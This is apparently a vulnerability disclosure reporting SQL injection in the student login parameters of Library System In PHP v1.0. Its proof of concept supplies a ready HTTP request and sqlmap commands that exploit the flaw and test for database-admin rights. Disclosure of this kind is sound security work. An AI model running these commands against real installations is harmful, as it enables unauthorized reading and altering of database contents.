# Library System In PHP - SQL Injection (Student Login)

### Vendor Homepage:

> https://code-projects.org/

### Software Link:

> [Library System In PHP](https://code-projects.org/library-system-in-php-with-source-code/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /Lms/Source/librarian/user/student/login.php

> Two parameters `username` and `password` within student login are vulnerable to SQL Injection.


![username](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/3Library%20System%20In%20PHP-Sqli-student_login_username.png)

![password](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/3Library%20System%20In%20PHP-Sqli-student_login_password.png)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `studentlogin.txt`:

```
POST /Lms/Source/librarian/user/student/login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://172.16.8.56/Lms/Source/librarian/user/index.php
Cookie: PHPSESSID=4nq5is5jf875uo0a4v5nohv7s7
Content-Length: 87
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Host: 172.16.8.56
Connection: Keep-alive

login=Login&password=-1&username=TYYHyRvY
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r studentlogin.txt --batch --dbms MYSQL --is-dba -p username
```
```
sqlmap -r studentlogin.txt --batch --dbms MYSQL --is-dba -p password
```


## Recommendations

When using this Library System In PHP, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
